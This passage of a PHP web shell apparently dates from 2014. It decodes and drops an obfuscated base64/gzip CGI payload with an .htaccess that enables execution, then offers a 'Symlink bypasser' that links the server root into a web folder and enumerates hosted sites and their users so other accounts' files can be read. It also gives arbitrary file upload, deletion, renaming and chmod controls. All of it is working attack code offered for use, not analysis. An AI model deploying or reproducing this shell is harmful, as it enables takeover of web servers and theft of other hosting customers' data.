uApDVuJkK6OiBA6LJZVe1zkgFS2tzpO6M2Qy1V11/IeLOQM9VP5rqXTA3RuRdTrQMoBSismIyZpb23BRAPG6TLdIepBQkBHqPPemqKlNa0e7FV8hmD8gc0CyRBlwxO9xIoOBkavg1OgE6eZFvpT4WMf+VSOQq9rReqIZfU6QsZhMNTZGIsUBKZqn+clWAhaV1qq6xbSmQeq0zq9obUXTZFHxIh6KKZeG02YJ0cttN9oRNO2cn+aerGXfn2R0KA910ar6RxZNgd6SuY4iGQbZVkbqg0LqR4uTFv28l3giKitQ6DeWBAlMrP6Rh/mmlaWTZKe7SykY6++RixATKJPdu1515rQtVB5wUM7jcaJei27d3BQZHSzsWJ11k2dU6ITeCAYLRVcGrtE0KWf9vZf8dHOyUf4aUPeTDpkIM6xD3FexA+SP+awFKgB+1kNDzVUup2V4dyDwT+DbBBdqb6FEQ1Q9fzryenZ8Qdk9ZQ369KPrNoioQmldchSNch2HwbIqqdEVTCvW3Uot9JlQ02dMek22uq9szuDj/fvYe6oYcxpNW3zN1X6O0xcH1frf/651pq28BCE3nHGYY4+b3i3CY1M5aIR1YbXbSq412l+go+0jec6qmJFb774zZK0NpjDo72eFwYUdbC60gMqHVvge/AzG1Sf/ICUYLpOgEOrpxcnlx+0y5bOXIYD6npIlbg8FFSLptuNkNTPnLR0QgWWEoJGMR10rcqq4yvgeGt9udDDs9HQ5sPcXwxkPeA86obpKtFCgeqYtVwgFssF6S36tuIrC8YZuCtNMlKbXs9q/wc=';
$decryp=gzinflate(base64_decode($da));
mkdir('perl', 0777);
$hope = fopen("perl/.htaccess", 'w');
$hcon= "Options FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .root\nAddHandler cgi-script .root\nAddHandler cgi-script .root"; 
fwrite ( $hope, $hcon ) ;
$pelfile = fopen("perl/in.root" ,"w");
fwrite ($pelfile,$decryp);
    chmod("perl/in.root",0755);
   echo "<iframe src=perl/in.root width=50% height=70% ></iframe><br><br> ";
   echo "<font size=4>check in this directory for configuration files once you have done with this script<br><a href=perl/><u>Open Configuration File</u></a></font>";

}
?>
<form method=post>
<font color=white size=2>Symlink bypasser ( Use this tools if Cant read /etc/named ) </font><p>
<input type=submit name="ms" value="Let's play with us  " /></form>
<?php
	if(isset($_POST['ms']))
	{
		error_reporting(0);
		$cmd="ls /var/named";
		$r=shell_exec($cmd);
		

		mkdir('SymSec',0777);




$rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$f = fopen('SymSec/.htaccess','w');

$security = symlink("/","SymSec/root");

fwrite($f , $rr);
		?><form method=post><textarea rows=1 cols=1 name=web><?php echo $r;?></textarea><br><input type=submit name=w value="Start the game " />
</form>
<?php
		
		}
	
error_reporting(0);
$webs=explode("\n",$_POST['web']);
if(isset($_POST['w']))
{
$webs=explode("\n",$_POST['web']);
echo "<table width=40% align=center border=1>
<tr><td align=center>Websites</td><td align=center>usernames</td><td>symlink</td></tr>";
foreach($webs as $f)
{
	$str=substr_replace($f,"",-4);
	

$user = posix_getpwuid(@fileowner("/etc/valiases/".$str));

echo "<table border=1 width=40%><tr><td align=center><font color=red>".$str."</font></td><td align=center><font color=white>".$user['name']."</td><td><a href=SymSec/root/home/".$user['name']."/public_html/>Open the Symlink file</a></tr></table>"; flush();


	
	
	
	}	
	
	}


?>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Success  ^_^ <b><br><br>'; }
else { echo '<b>Upload Failed :(  </b><br><br>'; }
}
?>
<?php
//Make directory stuff
if (isset($_POST['do_create_dir'])) {
    $cdir = $_POST['create_dir'];
    if (is_dir($cdir)) {
        success("dir_exists", $cdir);
    } else {
        if (mkdir($cdir, 0777)) {
            success("createdir", $cdir);
        } else {
            error("Directory was not created!");
        }
    }
}
//Make file stuff
if (isset($_POST['do_create_file'])) {
    $cfile = $_POST['create_file'];
    if (file_exists($cfile)) {
        success("file_exists", $cfile);
    } else {
        if (fopen($cfile, "w+")) {
            success("file_created", $cfile);
        } else {
            error("File was not created");
        }
    }
}
//Go directory
if (isset($_POST['do_go_dir'])) {
    $godir = $_POST['go_dir'];
    echo "<script>window.location = 'http://$domain$script?path=$godir'</script>";
}
//Go Edit file
if (isset($_POST['do_go_edit'])) {
    $gefile = $_POST['go_edit_file'];
    if (file_exists($gefile)) {
        header("Location: http://$domain$script?editfile=$gefile");
    } else {
        error("File does not exist!");
    }
}
//Upload File
if (isset($_POST['do_upload_file'])) {
    $udir = $_POST['upload_location'];
    $uname = $_FILES['upload_file']['name'];
    $both = "$udir$uname";
    if (file_exists($both)) {
        success("file_exists", $both);
    } else {
        switch ($_FILES['upload_file']['error']) {
            case 0:
                if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $udir . '/' . $uname)) {
                    success("file_uploaded");
                } else {
                    error("Failed To Upload File!");
                }
        }
    }
}
//Kill Shell
if (isset($_GET['kill'])) {
    if (unlink("$dir/$script2")) {
        success("shell_killed");
    } else {
        error("Failed to kill shell!");
    }
}
//Delete Directory
if (isset($_GET['deldir'])) {
    $deldir = $_GET['deldir'];
    $redir = dirname($deldir);
    if (rmdir($deldir)) {
        success("dir_del", rtrim($redir, '/'));
    } else {
        error("Failed to delete directory!");
    }
}
//Rename Directory
if (isset($_GET['rendir'])) {
    $rendir = $_GET['rendir'];
    $dend = $_GET['old'];
    echo "<center>
<form action='' method='post'>
<input type='text' class='text' name='new_dir_name' value='$dend'>
<input type='submit' name='do_rename_dir' value='Rename'>
</center>";
}
if (isset($_POST['do_rename_dir'])) {
    $newdir = $_POST['new_dir_name'];
    $rendir = $_GET['rendir'];
    $dend = $_GET['old'];
    if (rename("$rendir/$dend", "$rendir/$newdir")) {
        success("dir_renamed", $rendir);
    } else {
        error("Directory was not renamed!");
    }
}
//Delete file
if (isset($_GET['delfile'])) {
    $delfile = $_GET['delfile'];
    $redir = dirname($delfile);
    if (unlink($delfile)) {
        success("filedelete", rtrim($redir, '/'));
    } else {
        error("Failed to delete file!");
    }
}
//Rename File
if (isset($_GET['renfile'])) {
    $renfile = $_GET['renfile'];
    $fend = $_GET['old'];
    echo "<center>
<form action='' method='post'>
<input type='text' class='text' name='new_file_name' value='$fend'>
<input type='submit' name='do_rename_file' value='Rename'>
</center>";
}
if (isset($_POST['do_rename_file'])) {
    $newfile = $_POST['new_file_name'];
    $renfile = $_GET['renfile'];
    $fend = $_GET['old'];
    if (rename("$renfile/$fend", "$renfile/$newfile")) {
        success("file_renamed", $renfile);
    } else {
        error("File was not renamed!");
    }
}
//Mass Files Stuff
if (isset($_POST['mass_files'])) {
    $action = $_POST['mass_action'];
    $chmodvalue = $_POST['chmod_value'];
    $box = $_POST['delbox'];
    if ($action == "Delete") {
        foreach ($box as $b) {
            if (is_dir($b)) {
                if (rmdir($b)) {
                    echo "<font color='green'>Deleted Directory: $b</font><br>";
                } else {
                    echo "<font color='red'>Failed To Delete Directory: $b</font><br>";
                }
            } else {
                if (unlink($b)) {
                    echo "<font color='green'>Deleted File: $b</font><br>";
                } else {
                    echo "<font color='red'>Failed To Delete file: $b</font><br>";
                }
            }
        }
    }
    if ($action == "chmod") {
        foreach ($box as $b) {
            if (is_dir($b)) {
                if (chmod($b, $chmodvalue)) {
                    echo "<font color='green'>Changed Permissions Of Directory: $b</font><br>";
                } else {
                    echo "<font color='red'>Failed To Change Permissions Of Directory: $b</font><br>";
                }
            } else {
                if (chmod($b, $chmodvalue)) {
                    echo "<font color='green'>Changed Persmissions Of File: $b</font><br>";
                } else {
                    echo "<font color='red'>Failed To Change Permissions Of File: $b</font><br>";
                }
            }
        }
    }
}
?>
<footer>
<p>Copyright 2014 by: <a href="http://ihsan-muhammad.com/">Muhammad Ihsan</a></p>
</footer>
</body>
</html>